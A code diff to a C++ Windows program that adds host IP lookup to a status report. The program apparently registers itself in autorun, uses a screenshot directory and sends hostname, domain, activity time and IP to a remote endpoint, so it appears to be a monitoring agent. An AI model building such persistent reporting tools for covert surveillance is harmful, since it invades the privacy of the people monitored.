@@ -150,6 +150,60 @@ string getLastUserActivityTime() {
     return oss.str();
 }
 
+string getHostIp() {
+    WSADATA wsaData;
+    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (result != 0) {
+        std::cerr << "WSAStartup failed: " << result << std::endl;
+        return "";
+    }
+
+    char hostName[256];
+    if (gethostname(hostName, sizeof(hostName)) == SOCKET_ERROR) {
+        std::cerr << "gethostname failed: " << WSAGetLastError() << std::endl;
+        WSACleanup();
+        return "";
+    }
+
+    addrinfo hints = {};
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    addrinfo* addrInfo = nullptr;
+    addrinfo* p = nullptr;
+    std::string ipAddress;
+
+    if (getaddrinfo(hostName, nullptr, &hints, &addrInfo) != 0) {
+        std::cerr << "getaddrinfo failed: " << WSAGetLastError() << std::endl;
+        WSACleanup();
+        return "";
+    }
+
+    for (p = addrInfo; p != nullptr; p = p->ai_next) {
+        char ipString[INET6_ADDRSTRLEN];
+        if (p->ai_family == AF_INET) {
+            sockaddr_in* ipv4 = reinterpret_cast<sockaddr_in*>(p->ai_addr);
+            inet_ntop(p->ai_family, &(ipv4->sin_addr), ipString, sizeof(ipString));
+        }
+        else if (p->ai_family == AF_INET6) {
+            sockaddr_in6* ipv6 = reinterpret_cast<sockaddr_in6*>(p->ai_addr);
+            inet_ntop(p->ai_family, &(ipv6->sin6_addr), ipString, sizeof(ipString));
+        }
+        else {
+            continue;
+        }
+
+        ipAddress = ipString;
+        break;
+    }
+
+    freeaddrinfo(addrInfo);
+    WSACleanup();
+
+    return ipAddress;
+}
+
 int main() {
     addToAurorun(L"Exe", getExecProgramPath());
 
@@ -161,7 +215,8 @@ int main() {
     string screenshot_dir = conf["screenshot_dir"];
     string host_name = getPCName();
     string host_domain_name = getPCDomain();
-    auto lastActiveTime = getLastUserActivityTime();
+    string lastActiveTime = getLastUserActivityTime();
+    string host_ip = getHostIp();
 
     if (host_domain_name.length() == 0) {
         host_domain_name = "no domain";
@@ -192,6 +247,7 @@ int main() {
                     info += "hostname: " + host_name + "\n";
                     info += "domain: " + host_domain_name + "\n";
                     info += "last_activ_time: " + getLastUserActivityTime() + "\n";
+                    info += "ip: " + host_ip + "\n";
 
                     client->sendMessage("STATE START");
                     client->sendMessage(info);
